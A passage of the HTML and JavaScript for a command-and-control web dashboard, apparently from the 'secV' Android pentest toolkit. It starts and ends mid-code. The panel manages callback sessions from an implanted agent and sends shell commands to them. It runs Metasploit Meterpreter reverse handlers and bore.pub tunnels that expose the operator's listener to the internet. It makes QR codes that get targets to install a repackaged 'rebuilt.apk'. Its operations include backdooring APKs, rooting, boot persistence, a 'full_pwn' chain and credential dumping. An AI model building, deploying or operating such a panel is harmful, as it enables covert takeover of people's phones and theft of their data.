.qr-wrap{{display:inline-block;background:#fff;padding:12px;margin:1rem 0}}
.qr-wrap img{{display:block}}
/* Footer */
footer{{border-top:1px solid var(--border);padding:1.75rem 2.5rem;display:flex;
  align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem;
  max-width:1020px;margin:0 auto}}
.foot-brand{{font-family:var(--disp);font-size:0.88rem;font-weight:700;color:var(--muted);
  text-decoration:none;letter-spacing:-0.02em}}
.foot-links{{display:flex;gap:1.75rem}}
.foot-link{{font-size:0.54rem;letter-spacing:0.1em;text-transform:uppercase;color:var(--muted);
  text-decoration:none;transition:color var(--t)}}
.foot-link:hover{{color:var(--text)}}
.foot-note{{font-size:0.5rem;color:var(--dim);letter-spacing:0.06em}}
@media(max-width:760px){{
  nav{{padding:0 1.25rem}}
  .nav-link,.nav-status{{display:none}}
  .burger{{display:flex}}
  .tab-section{{padding:5rem 1.25rem 4rem}}
  .two-col{{grid-template-columns:1fr}}
  .module-grid{{grid-template-columns:1fr}}
  footer{{padding:1.25rem}}
}}
</style>
</head>
<body>

<nav id="nav">
  <a class="logo" href="#">
    secV <span class="logo-sep">/</span> <span class="logo-sub">C2</span>
  </a>
  <div class="nav-links" id="nav-links">
    <button class="nav-link active" onclick="tab('sessions')">Sessions <span id="nb-sessions" style="color:var(--grey)"></span></button>
    <button class="nav-link" onclick="tab('bore')">Bore</button>
    <button class="nav-link" onclick="tab('msf')">MSF <span id="nb-msf" style="color:var(--grey)"></span></button>
    <button class="nav-link" onclick="tab('qr')">QR</button>
    <button class="nav-link" onclick="tab('ops')">Operations</button>
    <button class="nav-link" onclick="tab('logs')">Logs</button>
    <div class="nav-status" id="nav-status">
      <div class="ns-item"><div class="ns-dot on" id="st-agent"></div><span>agent :8889</span></div>
      <div class="ns-item"><div class="ns-dot" id="st-msf-dot"></div><span id="st-msf-lbl">msfrpc</span></div>
      <div class="ns-item"><div class="ns-dot" id="st-bore-dot"></div><span id="st-bore-lbl">bore</span></div>
    </div>
    <button class="nav-btn" onclick="tab('ops')">run op</button>
  </div>
  <button class="burger" id="burger"><span></span><span></span><span></span></button>
</nav>

<div id="notify"></div>

<!-- ══════════════════════════════════════════ SESSIONS ══ -->
<div class="tab-section active" id="sec-sessions">
  <div class="section-label">C2 Dashboard</div>
  <h2>Active Sessions</h2>
  <p class="body-text">secV agent callbacks and MSF Meterpreter sessions. Click a session to interact.</p>

  <div id="sess-grid" class="module-grid">
    <div style="background:var(--bg);padding:2.5rem;color:var(--muted);font-size:0.74rem;text-align:center">
      No active sessions - waiting for callbacks on TCP :8889
    </div>
  </div>

  <div id="interact-panel" style="display:none">
    <hr class="rule">
    <div class="section-label">Session Interact</div>
    <h3 id="interact-title" style="margin-top:0.5rem">Session</h3>
    <div class="terminal" id="interact-term"></div>
    <div style="display:flex;gap:0.5rem;margin-top:0.75rem;flex-wrap:wrap">
      <input class="form-input" id="cmd-inp" style="flex:1;min-width:240px"
        placeholder="SH:id   ROOT_SHELL:host:port   APK:url"
        onkeydown="if(event.key==='Enter')sendCmd()">
      <button class="btn primary" onclick="sendCmd()">Send</button>
      <button class="btn" onclick="sendCmd('SH:id')">id</button>
      <button class="btn" onclick="sendCmd('SH:whoami')">whoami</button>
      <button class="btn" onclick="sendCmd('SH:uname -a')">uname</button>
      <button class="btn danger" onclick="killSession()">Kill</button>
      <button class="btn" onclick="showEncryptModal()">Encrypt &amp; Save</button>
      <button class="btn danger" onclick="logout()">Logout</button>
    </div>
  </div>
</div>

<!-- ══════════════════════════════════════════ BORE ══ -->
<div class="tab-section" id="sec-bore">
  <div class="section-label">Infrastructure</div>
  <h2>Bore Tunnels</h2>
  <p class="body-text">WAN tunnels via bore.pub. No port forwarding needed. Tunnel ports through the relay to reach your machine from any network.</p>

  <div id="bore-services">
    <div style="color:var(--muted);font-size:0.74rem">Loading...</div>
  </div>

  <hr class="rule">
  <div class="two-col">
    <div class="col-card">
      <div class="col-card-title">Start Bore Tunnel</div>
      <div class="form-row">
        <span class="form-label">Local Port</span>
        <input class="form-input" id="b-lport" value="8080" style="width:90px">
      </div>
      <div class="form-row">
        <span class="form-label">Bore Port</span>
        <input class="form-input" id="b-bport" value="{cfg['bore_dex_port']}" style="width:100px">
      </div>
      <div class="form-row">
        <span class="form-label">Server</span>
        <input class="form-input" id="b-server" value="{cfg['bore_server']}" style="width:160px">
      </div>
      <div class="btn-row">
        <button class="btn primary" onclick="startBore()">Start Tunnel</button>
      </div>
    </div>
    <div class="col-card">
      <div class="col-card-title">HTTP File Server</div>
      <div class="form-row">
        <span class="form-label">Directory</span>
        <input class="form-input" id="b-dir" value="{cfg['output_dir']}" style="width:200px">
      </div>
      <div class="form-row">
        <span class="form-label">Port</span>
        <input class="form-input" id="b-hport" value="8080" style="width:90px">
      </div>
      <div class="btn-row">
        <button class="btn primary" onclick="startHTTP()">Start HTTP Server</button>
      </div>
    </div>
  </div>

  <div class="callout">
    <strong>Full C2 stack</strong> — starts HTTP server on :8080 + DEX tunnel (:8080 → bore.pub:{cfg['bore_dex_port']}) + MSF tunnel (:{cfg['msf_lport']} → bore.pub:{cfg['bore_msf_port']})
    <div class="btn-row" style="margin-top:0.75rem">
      <button class="btn primary" onclick="startC2Stack()">Start Full C2 Stack</button>
      <button class="btn danger" onclick="stopAll()">Stop All</button>
    </div>
  </div>
</div>

<!-- ══════════════════════════════════════════ MSF ══ -->
<div class="tab-section" id="sec-msf">
  <div class="section-label">Metasploit</div>
  <h2>MSF Sessions</h2>
  <p class="body-text">Sessions via msfrpcd. Run <code>set operation msf_handler; run</code> in android_pentest to start the RPC daemon, then connect here.</p>

  <div id="msf-grid" class="module-grid">
    <div style="background:var(--bg);padding:2.5rem;color:var(--muted);font-size:0.74rem;text-align:center">
      msfrpcd not connected - run msf_handler first
    </div>
  </div>

  <div id="msf-interact-panel" style="display:none">
    <hr class="rule">
    <h3 id="msf-interact-title" style="margin-top:0.5rem">MSF Session</h3>
    <div class="terminal" id="msf-term"></div>
    <div style="display:flex;gap:0.5rem;margin-top:0.75rem;flex-wrap:wrap">
      <input class="form-input" id="msf-cmd-inp" style="flex:1;min-width:200px"
        placeholder="sysinfo  getuid  shell  migrate PID"
        onkeydown="if(event.key==='Enter')sendMSFCmd()">
      <button class="btn primary" onclick="sendMSFCmd()">Run</button>
      <button class="btn" onclick="sendMSFCmd('sysinfo')">sysinfo</button>
      <button class="btn" onclick="sendMSFCmd('getuid')">getuid</button>
      <button class="btn" onclick="sendMSFCmd('shell')">shell</button>
    </div>
  </div>

  <hr class="rule">
  <h3>Start Handler</h3>
  <div class="two-col">
    <div class="col-card">
      <div class="col-card-title">Handler Config</div>
      <div class="form-row">
        <span class="form-label">LPORT</span>
        <input class="form-input" id="msf-lport" value="{cfg['msf_lport']}" style="width:90px">
      </div>
      <div class="form-row">
        <span class="form-label">Payload</span>
        <select class="form-select" id="msf-payload">
          <option value="android/meterpreter/reverse_http" selected>android/meterpreter/reverse_http</option>
          <option value="android/meterpreter/reverse_tcp">android/meterpreter/reverse_tcp</option>
          <option value="android/meterpreter/reverse_https">android/meterpreter/reverse_https</option>
        </select>
      </div>
      <div class="btn-row">
        <button class="btn primary" onclick="startMSFHandler()">Start Handler</button>
        <button class="btn" onclick="fetchMSF()">Refresh Sessions</button>
      </div>
    </div>
    <div class="col-card">
      <div class="col-card-title">RPC Connection</div>
      <p style="font-size:0.68rem;color:var(--muted);line-height:1.75">
        msfrpc config is read from <code>~/.secv/msf_rpc.json</code> written by the msf_handler operation.
        Once connected, sessions appear in the grid above.
      </p>
    </div>
  </div>
</div>

<!-- ══════════════════════════════════════════ QR ══ -->
<div class="tab-section" id="sec-qr">
  <div class="section-label">Delivery</div>
  <h2>QR APK Delivery</h2>
  <p class="body-text">Generate a scannable QR code for WAN APK delivery. The target scans it to download and install the rebuilt APK from the bore tunnel.</p>

  <div class="two-col">
    <div>
      <h3 style="margin-top:0">Generate</h3>
      <div class="form-row">
        <span class="form-label">APK URL</span>
        <input class="form-input" id="qr-url"
          value="http://{cfg['bore_server']}:{cfg['bore_dex_port']}/rebuilt.apk"
          style="width:340px">
      </div>
      <div style="font-size:0.58rem;color:var(--muted);margin-bottom:1.25rem">
        Quick fill:
        <span style="cursor:pointer;color:var(--off);text-decoration:underline" onclick="setQRUrl('rebuilt.apk')">rebuilt.apk</span>
        &nbsp;&middot;&nbsp;
        <span style="cursor:pointer;color:var(--off);text-decoration:underline" onclick="setQRUrl('s.dex')">s.dex</span>
      </div>
      <div class="btn-row">
        <button class="btn primary" onclick="genQR()">Generate QR</button>
        <button class="btn" onclick="copyQRUrl()">Copy URL</button>
        <button class="btn" onclick="downloadQR()">Download PNG</button>
      </div>
      <div id="qr-url-label" style="font-size:0.62rem;color:var(--muted);margin-top:1rem;word-break:break-all"></div>
    </div>
    <div style="text-align:center;padding-top:0.5rem">
      <div id="qr-display" style="min-height:220px;display:flex;align-items:center;justify-content:center;
        border:1px solid var(--border);background:var(--bg1);color:var(--muted);font-size:0.72rem">
        Enter URL above and click Generate
      </div>
    </div>
  </div>
</div>

<!-- ══════════════════════════════════════════ OPERATIONS ══ -->
<div class="tab-section" id="sec-ops">
  <div class="section-label">android_pentest</div>
  <h2>Operations</h2>
  <p class="body-text">Run any android_pentest operation with full parameter control. Output streams live below.</p>

  <div class="op-row" id="op-row"></div>

  <div id="op-form-box" style="display:none">
    <div class="col-card" style="margin-bottom:1.5rem">
      <div class="col-card-title" id="op-form-title">Parameters</div>
      <div id="op-form-fields"></div>
      <div class="btn-row" id="op-btn-row">
        <button class="btn primary" onclick="runOperation()" id="op-run-btn" disabled>Run Operation</button>
        <span id="op-job-status" style="font-size:0.62rem;color:var(--muted);align-self:center;margin-left:0.5rem"></span>
      </div>
    </div>
  </div>

  <div id="op-output-box" style="display:none">
    <div class="section-label" style="margin-top:1.5rem">Output</div>
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:0.5rem">
      <h3 id="op-output-title" style="margin:0">Job output</h3>
      <button class="btn" onclick="document.getElementById('op-term').innerHTML=''">Clear</button>
    </div>
    <div class="terminal" id="op-term" style="height:420px"></div>
  </div>
</div>

<!-- ══════════════════════════════════════════ LOGS ══ -->
<div class="tab-section" id="sec-logs">
  <div class="section-label">Session Archive</div>
  <h2>Session Logs</h2>
  <p class="body-text">Encrypted .scv session archives. Every session is saved automatically on close. Password-protected sessions use 5-layer encryption (PBKDF2-SHA512 + SHA3-512 + PBKDF2-SHA256 + Scrypt + AES-GCM/ChaCha20).</p>

  <div style="display:flex;gap:0.5rem;margin-bottom:1.25rem">
    <button class="btn" onclick="fetchLogs()">Refresh</button>
  </div>
  <div class="log-list" id="logs-list">
    <div style="padding:2rem;color:var(--muted);font-size:0.74rem;text-align:center">Loading...</div>
  </div>

  <div id="log-detail" style="display:none;margin-top:2rem">
    <hr class="rule">
    <div class="section-label">Detail</div>
    <h3 id="log-detail-title" style="margin-top:0.5rem"></h3>
    <div id="log-detail-content"></div>
  </div>
</div>

<!-- ══════════════════════════════════════════ PASSWORD MODAL ══ -->
<div id="pw-modal">
  <div class="pw-box">
    <div class="pw-title" id="pw-modal-title">Encrypt Session</div>
    <div class="pw-sub" id="pw-modal-sub">5-layer: PBKDF2-SHA512 + SHA3-512 + PBKDF2-SHA256 + Scrypt (2^17) + AES-256-GCM / ChaCha20-Poly1305</div>
    <div class="form-row">
      <span class="form-label">Password</span>
      <input class="form-input" id="pw-inp" type="password" placeholder="Choose a strong password"
        style="flex:1" onkeydown="if(event.key==='Enter')pwConfirm()">
    </div>
    <div class="form-row" id="pw-confirm-row">
      <span class="form-label">Confirm</span>
      <input class="form-input" id="pw-inp2" type="password" placeholder="Confirm password"
        style="flex:1" onkeydown="if(event.key==='Enter')pwConfirm()">
    </div>
    <div id="pw-warn" style="font-size:0.62rem;color:#aa5555;margin-bottom:0.75rem;min-height:1rem"></div>
    <div class="btn-row">
      <button class="btn" onclick="closePWModal()">Cancel</button>
      <button class="btn primary" onclick="pwConfirm()" id="pw-confirm-btn">Encrypt</button>
    </div>
  </div>
</div>

<footer>
  <a class="foot-brand" href="#">secV C2</a>
  <div class="foot-links">
    <a class="foot-link" href="https://github.com/secvulnhub/SecV" target="_blank">GitHub</a>
    <a class="foot-link" href="https://secvulnhub.github.io/Documentations/secV/" target="_blank">Docs</a>
    <a class="foot-link" href="https://secvulnhub.github.io/Documentations/secV/modules/android_pentest.html" target="_blank">android_pentest</a>
  </div>
  <span class="foot-note">secV by 0xb0rn3 &middot; MIT License</span>
</footer>

<script>
// ── State ──────────────────────────────────────────────────────────────────────
let activeTab = 'sessions';
let selectedSession = null;
let selectedMSFSession = null;
let activeOpJob = null;
let activeOp = null;
let termPollInterval = null;
let opPollInterval = null;

const CFG = {{
  bore_dex_port: {cfg['bore_dex_port']},
  bore_msf_port: {cfg['bore_msf_port']},
  bore_server: '{cfg['bore_server']}',
  output_dir: '{cfg['output_dir']}',
  msf_lport: {cfg['msf_lport']},
}};

const OPS = [
  {{name:'rebuild', desc:'WAN C2 APK', params:[
    {{k:'apk_path',lbl:'APK Path',type:'text',default:''}},
    {{k:'bore_dex_port',lbl:'DEX Port',type:'number',default:CFG.bore_dex_port}},
    {{k:'bore_msf_port',lbl:'MSF Port',type:'number',default:CFG.bore_msf_port}},
    {{k:'bore_server',lbl:'bore Server',type:'text',default:CFG.bore_server}},
  ]}},
  {{name:'recon',desc:'Device recon',params:[]}},
  {{name:'backdoor_apk',desc:'Template inject',params:[
    {{k:'package',lbl:'Package',type:'text',default:''}},
    {{k:'lhost',lbl:'LHOST',type:'text',default:'auto'}},
    {{k:'lport',lbl:'LPORT',type:'number',default:4444}},
    {{k:'install',lbl:'Install',type:'select',options:['false','true'],default:'false'}},
  ]}},
  {{name:'frida_hook',desc:'SSL unpin / root bypass',params:[
    {{k:'package',lbl:'Package',type:'text',default:''}},
    {{k:'hook_mode',lbl:'Mode',type:'select',options:['all','ssl_unpin','root_bypass','dump_creds','trace'],default:'all'}},
  ]}},
  {{name:'msf_handler',desc:'Start RPC handler',params:[
    {{k:'lhost',lbl:'LHOST',type:'text',default:'auto'}},
    {{k:'lport',lbl:'LPORT',type:'number',default:4444}},
  ]}},
  {{name:'wan_expose',desc:'Cloudflare WAN',params:[
    {{k:'lport',lbl:'LPORT',type:'number',default:4444}},
    {{k:'serve_port',lbl:'Serve Port',type:'number',default:8888}},
  ]}},
  {{name:'get_root',desc:'Multi-vector root',params:[]}},
  {{name:'inject_agent',desc:'Native recon agent',params:[
    {{k:'agent_mode',lbl:'Mode',type:'select',options:['recon','exploit','c2'],default:'recon'}},
    {{k:'c2_host',lbl:'C2 Host',type:'text',default:'auto'}},
    {{k:'c2_port',lbl:'C2 Port',type:'number',default:8889}},
  ]}},
  {{name:'adb_wifi',desc:'ADB over WiFi',params:[]}},
  {{name:'full_pwn',desc:'7-step chain',params:[
    {{k:'lhost',lbl:'LHOST',type:'text',default:'auto'}},
    {{k:'lport',lbl:'LPORT',type:'number',default:4444}},
  ]}},
  {{name:'device_net_scan',desc:'Scan device WiFi',params:[]}},
  {{name:'persist',desc:'Boot persistence',params:[]}},
  {{name:'c2_gui',desc:'Launch C2 GUI',params:[]}},
];

// ── Tab switching ──────────────────────────────────────────────────────────────
function tab(name) {{
  document.querySelectorAll('.tab-section').forEach(s => s.classList.remove('active'));
  document.querySelectorAll('.nav-link').forEach(n => n.classList.remove('active'));
  document.getElementById('sec-' + name).classList.add('active');
  document.querySelectorAll('.nav-link').forEach(n => {{
    if (n.textContent.trim().toLowerCase().startsWith(name.toLowerCase())) n.classList.add('active');
  }});
  activeTab = name;
  if (name==='sessions') fetchSessions();
  else if (name==='bore') fetchBore();
  else if (name==='msf') fetchMSF();
  else if (name==='logs') fetchLogs();
  else if (name==='ops') buildOpRow();
}}

// ── Notifications ──────────────────────────────────────────────────────────────
function notify(msg, type='') {{
  const el = document.createElement('div');
  el.className = 'notif ' + type;
  el.textContent = msg;
  document.getElementById('notify').appendChild(el);
  setTimeout(() => el.remove(), 4000);
}}

// ── API ────────────────────────────────────────────────────────────────────────
async function api(path, opts={{}}) {{
  try {{ return await (await fetch('/api' + path, opts)).json(); }}
  catch(e) {{ return {{error: e.message}}; }}
}}
function post(path, body) {{
  return api(path, {{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify(body)}});
}}

// ── Sessions ──────────────────────────────────────────────────────────────────
async function fetchSessions() {{
  const data = await api('/sessions');
  const sessions = data.sessions || [];
  const n = sessions.length;
  document.getElementById('nb-sessions').textContent = n ? `(${{n}})` : '';
  document.getElementById('st-agent').className = 'ns-dot on';
  const grid = document.getElementById('sess-grid');
  if (!n) {{
    grid.innerHTML = '<div style="background:var(--bg);padding:2.5rem;color:var(--muted);font-size:0.74rem;text-align:center">No active sessions - waiting for callbacks on TCP :8889</div>';
    return;
  }}
  grid.innerHTML = sessions.map(s => {{
    const rooted = s.root && s.root.includes('rooted');
    const status = s.active ? (rooted ? 'status-beta' : 'status-stable') : 'status-wip';
    const statusTxt = s.active ? (rooted ? 'rooted' : 'connected') : 'offline';
    return `<div class="module-card ${{selectedSession===s.addr?'selected':''}} ${{!s.active?'offline':''}}"
        onclick="selectSession('${{s.addr}}')">
      <div class="mod-status ${{status}}">${{statusTxt}}</div>
      <div class="mod-name">${{escHtml(s.model||'Unknown Device')}}</div>
      <div class="mod-addr">${{escHtml(s.addr)}}</div>
      <div class="mod-desc">Android ${{s.android||'?'}} / SDK ${{s.sdk||'?'}} &middot; ${{escHtml(s.ip||'?')}}<br>Patch: ${{s.patch||'?'}} &middot; ${{s.chipset||'?'}}</div>
      <div class="mod-tags">
        <span class="tag">Android ${{s.android||'?'}}</span>
        ${{rooted?'<span class="tag">root</span>':''}}
        <span class="tag">${{s.agent||'?'}}</span>
        <span class="tag">${{s.mode||'recon'}}</span>
      </div>
      <div class="mod-arrow">→</div>
    </div>`;
  }}).join('');
  if (selectedSession) updateTerminal();
}}

function selectSession(addr) {{
  selectedSession = addr;
  document.getElementById('interact-panel').style.display = 'block';
  document.getElementById('interact-title').textContent = 'Session: ' + addr;
  if (termPollInterval) clearInterval(termPollInterval);
  termPollInterval = setInterval(updateTerminal, 2000);
  fetchSessions();
  updateTerminal();
}}

async function updateTerminal() {{
  if (!selectedSession) return;
  const data = await api('/sessions/' + encodeURIComponent(selectedSession) + '/output');
  const term = document.getElementById('interact-term');
  const lines = data.output || [];
  term.innerHTML = lines.map(l => {{
    const cls = l.text.startsWith('>')?'t-cmd':l.text.startsWith('[c')?'t-sys':'';
    return `<div class="t-line ${{cls}}"><span class="t-ts">${{escHtml(l.t)}}</span><span class="t-text">${{escHtml(l.text)}}</span></div>`;
  }}).join('');
  term.scrollTop = term.scrollHeight;
}}

async function sendCmd(preset) {{
  const cmd = preset || document.getElementById('cmd-inp').value.trim();
  if (!cmd || !selectedSession) return;
  document.getElementById('cmd-inp').value = '';
  const r = await post('/sessions/'+encodeURIComponent(selectedSession)+'/command', {{cmd}});
  if (r.error) notify(r.error,'err'); else notify('Command queued','ok');
}}

async function killSess(addr) {{
  addr = addr || selectedSession;
  if (!addr) return;
  await post('/sessions/'+encodeURIComponent(addr)+'/kill', {{}});
  notify('Session closed','ok');
  selectedSession = null;
  document.getElementById('interact-panel').style.display = 'none';
  fetchSessions();
}}

function killSession() {{ killSess(selectedSession); }}

async function exportSession() {{
  if (!selectedSession) return;
  await post('/sessions/'+encodeURIComponent(selectedSession)+'/export', {{}});
  notify('Saved to .scv','ok');
}}

// ── Bore ──────────────────────────────────────────────────────────────────────
async function fetchBore() {{
  const data = await api('/bore/status');
  const svcs = data.services || [];
  const running = svcs.filter(s=>s.running);
  const boreRunning = running.filter(s=>s.type==='bore').length;
  document.getElementById('st-bore-dot').className = 'ns-dot' + (running.length?' on':'');
  document.getElementById('st-bore-lbl').textContent = boreRunning ? `bore (${{boreRunning}})` : 'bore';
  const el = document.getElementById('bore-services');
  if (!svcs.length) {{
    el.innerHTML = '<div class="callout">No services running. Use the forms below to start bore tunnels or the HTTP server.</div>';
    return;
  }}
  el.innerHTML = '<div class="chain">' + svcs.map((s,i) => {{
    const label = s.type==='bore'
      ? `bore local ${{s.local_port}} → ${{CFG.bore_server}}:${{s.bore_port}}`
      : `python3 -m http.server ${{s.port}}`;
    const url = s.type==='bore'
      ? `http://${{CFG.bore_server}}:${{s.bore_port}}/`
      : `http://localhost:${{s.port}}/`;
    const stopAction = s.type==='bore'
      ? `stopSvc('bore',${{s.local_port}},${{s.bore_port}})`
      : `stopSvc('http',${{s.port}},0)`;
    return `<div class="chain-step">
      <div class="chain-num">${{String(i+1).padStart(2,'0')}}</div>
      <div>
        <div class="chain-title"><code>${{escHtml(label)}}</code> &nbsp;<span style="font-size:0.52rem;color:${{s.running?'#5a7a5a':'var(--muted)'}}">${{s.running?'&#x2022; running':'stopped'}}</span></div>
        <div class="chain-body">pid ${{s.pid}} &middot; <a href="${{url}}" target="_blank" style="color:var(--off);text-decoration:none">${{url}}</a>
          &nbsp;<button class="btn danger" style="padding:0.2rem 0.5rem;font-size:0.48rem" onclick="${{stopAction}}">stop</button>
        </div>
      </div>
    </div>`;
  }}).join('') + '</div>';
  // Install blocks for tunnel URLs
  const boreSvcs = svcs.filter(s=>s.type==='bore'&&s.running);
  if (boreSvcs.length) {{
    el.innerHTML += boreSvcs.map(s => `
      <div class="install-block">
        <span class="install-label">bore.pub:${{s.bore_port}}</span>
        <span class="install-cmd">http://${{CFG.bore_server}}:${{s.bore_port}}/rebuilt.apk</span>
        <button class="install-copy" onclick="navigator.clipboard.writeText('http://${{CFG.bore_server}}:${{s.bore_port}}/rebuilt.apk');notify('Copied','ok')">copy</button>
      </div>`).join('');
  }}
}}

async function startBore() {{
  const lp=parseInt(document.getElementById('b-lport').value),bp=parseInt(document.getElementById('b-bport').value),srv=document.getElementById('b-server').value;
  const r=await post('/bore/start',{{local_port:lp,bore_port:bp,bore_server:srv}});
  if(r.ok) notify(`Bore tunnel: bore.pub:${{bp}}`,'ok'); else notify('Start failed: '+(r.error||'?'),'err');
  fetchBore();
}}
async function startHTTP() {{
  const dir=document.getElementById('b-dir').value,port=parseInt(document.getElementById('b-hport').value);
  const r=await post('/bore/http/start',{{directory:dir,port}});
  if(r.ok) notify(`HTTP :${{port}}`,'ok'); else notify('Failed: '+(r.error||'?'),'err');
  fetchBore();
}}
async function startC2Stack() {{
  notify('Starting C2 stack...','ok');
  await post('/bore/http/start',{{directory:CFG.output_dir,port:8080}});
  await post('/bore/start',{{local_port:8080,bore_port:CFG.bore_dex_port,bore_server:CFG.bore_server}});
  await post('/bore/start',{{local_port:CFG.msf_lport,bore_port:CFG.bore_msf_port,bore_server:CFG.bore_server}});
  setTimeout(fetchBore,1500);
}}
async function stopSvc(type,port,borePort) {{
  if(type==='bore') await post('/bore/stop',{{local_port:port,bore_port:borePort}});
  else await post('/bore/http/stop',{{port}});
  fetchBore();
}}
async function stopAll() {{
  await post('/bore/stopall',{{}});
  notify('All services stopped','ok');
  setTimeout(fetchBore,500);
}}

// ── MSF ───────────────────────────────────────────────────────────────────────
async function fetchMSF() {{
  const data = await api('/msf/sessions');
  const sessions = data.sessions || [];
  document.getElementById('nb-msf').textContent = sessions.length ? `(${{sessions.length}})` : '';
  document.getElementById('st-msf-dot').className = 'ns-dot' + (data.connected?' on':'');
  const grid = document.getElementById('msf-grid');
  if (!sessions.length) {{
    grid.innerHTML = `<div style="background:var(--bg);padding:2.5rem;color:var(--muted);font-size:0.74rem;text-align:center">${{data.connected?'No active sessions':'msfrpcd not connected - run msf_handler first'}}</div>`;
    return;
  }}
  grid.innerHTML = sessions.map(s => `
    <div class="module-card ${{selectedMSFSession===s.id?'selected':''}}" onclick="selectMSFSession('${{s.id}}')">
      <div class="mod-status status-beta">meterpreter</div>
      <div class="mod-name">Session ${{s.id}}</div>
      <div class="mod-addr">${{escHtml(s.tunnel_local||'?')}}</div>
      <div class="mod-desc">${{escHtml(s.info||'No info')}} &middot; via ${{escHtml((s.via_exploit||'?').split('/').pop())}}</div>
      <div class="mod-tags"><span class="tag">${{escHtml(s.type||'?')}}</span></div>
      <div class="mod-arrow">→</div>
    </div>`).join('');
}}
function selectMSFSession(id) {{
  selectedMSFSession=id;
  document.getElementById('msf-interact-panel').style.display='block';
  document.getElementById('msf-interact-title').textContent='MSF Session '+id;
}}
async function sendMSFCmd(preset) {{
  const cmd=preset||document.getElementById('msf-cmd-inp').value.trim();
  if(!cmd||!selectedMSFSession) return;
  document.getElementById('msf-cmd-inp').value='';
  const r=await post('/msf/run',{{session_id:selectedMSFSession,cmd}});
  const term=document.getElementById('msf-term');
  term.innerHTML+=`<div class="t-line t-cmd"><span class="t-ts">cmd</span><span class="t-text">&gt; ${{escHtml(cmd)}}</span></div>`;
  if(r.result) term.innerHTML+=`<div class="t-line"><span class="t-ts">out</span><span class="t-text">${{escHtml(r.result)}}</span></div>`;
  else term.innerHTML+=`<div class="t-line t-err"><span class="t-ts">err</span><span class="t-text">${{r.error||'failed'}}</span></div>`;
  term.scrollTop=term.scrollHeight;
}}
async function startMSFHandler() {{
  const lport=document.getElementById('msf-lport').value;
  notify(`Starting handler on :${{lport}}`,'ok');
  await post('/operation',{{operation:'msf_handler',lhost:'auto',lport}});
}}

// ── QR ────────────────────────────────────────────────────────────────────────
async function genQR() {{
  const url=document.getElementById('qr-url').value.trim();
  if(!url) return;
  document.getElementById('qr-url-label').textContent=url;
  const data=await api('/qr?url='+encodeURIComponent(url));
  const disp=document.getElementById('qr-display');
  if(data.png_b64) {{
    disp.innerHTML=`<div class="qr-wrap"><img src="data:image/png;base64,${{data.png_b64}}" width="200" height="200"></div>`;
  }} else {{
    disp.innerHTML='<div style="color:#b89a48;font-size:0.72rem;padding:1rem">Install qrcode: pip3 install qrcode[pil] --break-system-packages</div>';
  }}
}}
function setQRUrl(f) {{ document.getElementById('qr-url').value=`http://${{CFG.bore_server}}:${{CFG.bore_dex_port}}/${{f}}`; }}
function copyQRUrl() {{ navigator.clipboard.writeText(document.getElementById('qr-url').value); notify('Copied','ok'); }}
async function downloadQR() {{
  const url=document.getElementById('qr-url').value.trim();
  const data=await api('/qr?url='+encodeURIComponent(url)+'&download=1');
  if(data.png_b64) {{
    const a=document.createElement('a');
    a.href='data:image/png;base64,'+data.png_b64;
    a.download='apk_delivery.png'; a.click();
  }}
}}

// ── Operations ────────────────────────────────────────────────────────────────
function buildOpRow() {{
  document.getElementById('op-row').innerHTML=OPS.map(op=>
    `<div class="op-item ${{activeOp===op.name?'active':''}}" onclick="selectOp('${{op.name}}')">${{op.name}}</div>`
  ).join('');
}}
function selectOp(name) {{
  activeOp=name;
  buildOpRow();
  const op=OPS.find(o=>o.name===name);
  if(!op) return;
  document.getElementById('op-form-box').style.display='block';
  document.getElementById('op-form-title').textContent=name+' — parameters';
  const fields=document.getElementById('op-form-fields');
  if(!op.params.length) {{
    fields.innerHTML='<div style="font-size:0.72rem;color:var(--muted);padding:0.5rem 0">No parameters required for this operation.</div>';
  }} else {{
    fields.innerHTML=op.params.map(p=>`
      <div class="form-row">
        <span class="form-label">${{p.lbl}}</span>
        ${{p.type==='select'
          ?`<select class="form-select" id="op-p-${{p.k}}">${{p.options.map(o=>`<option ${{o===p.default?'selected':''}}">${{o}}</option>`).join('')}}</select>`
          :`<input class="form-input" id="op-p-${{p.k}}" type="${{p.type}}" value="${{p.default}}" style="min-width:200px">`
        }}
      </div>`).join('');
  }}
  document.getElementById('op-run-btn').disabled=false;
}}
async function runOperation() {{
  if(!activeOp) return;
  const op=OPS.find(o=>o.name===activeOp);
  const params={{operation:activeOp}};
  (op.params||[]).forEach(p=>{{const el=document.getElementById('op-p-'+p.k);if(el)params[p.k]=el.value;}});
  document.getElementById('op-run-btn').disabled=true;
  document.getElementById('op-job-status').textContent='Starting...';
  const r=await post('/operation',params);
  if(r.job_id) {{
    activeOpJob=r.job_id;
    document.getElementById('op-job-status').textContent='job '+r.job_id;
    document.getElementById('op-output-box').style.display='block';
    document.getElementById('op-output-title').textContent=activeOp+' output';
    if(opPollInterval) clearInterval(opPollInterval);
    opPollInterval=setInterval(pollOpOutput,1500);
  }} else {{
    document.getElementById('op-job-status').textContent=r.error||'failed';
    document.getElementById('op-run-btn').disabled=false;
    notify(r.error||'Failed','err');
  }}
}}
async function pollOpOutput() {{
  if(!activeOpJob) return;
  const data=await api('/ops/'+activeOpJob);
  const term=document.getElementById('op-term');
  const lines=data.output||[];
  term.innerHTML=lines.map(l=>{{
    const cls=l.includes('error')||l.includes('ERROR')?'t-err':l.startsWith('[+]')?'t-sys':'';
    return `<div class="t-line ${{cls}}"><span class="t-text">${{escHtml(l)}}</span></div>`;
  }}).join('');
  term.scrollTop=term.scrollHeight;
  if(data.status!=='running') {{
    clearInterval(opPollInterval); opPollInterval=null;
    document.getElementById('op-run-btn').disabled=false;
    const ok=data.returncode===0;
    document.getElementById('op-job-status').textContent=`done (rc=${{data.returncode??'?'}})`;
    notify(`${{activeOp}} finished`,ok?'ok':'err');
    if(ok) fetchSessions();
  }}
}}

// ── Logs ──────────────────────────────────────────────────────────────────────
async function fetchLogs() {{
  const data=await api('/logs');
  const logs=data.logs||[];
  const el=document.getElementById('logs-list');
  if(!logs.length) {{
    el.innerHTML='<div style="padding:2rem;color:var(--muted);font-size:0.74rem;text-align:center">No session logs yet</div>';
    return;
  }}
  el.innerHTML=logs.map(l=>`
    <div class="log-row">
      <div>
        <div class="log-name">${{l.protected?'&#128274; ':''}}${{escHtml(l.name)}}</div>
        <div class="log-meta">${{l.size_kb}} KB &middot; ${{l.date}}${{l.protected?' &middot; 5-layer encrypted':''}}</div>
      </div>
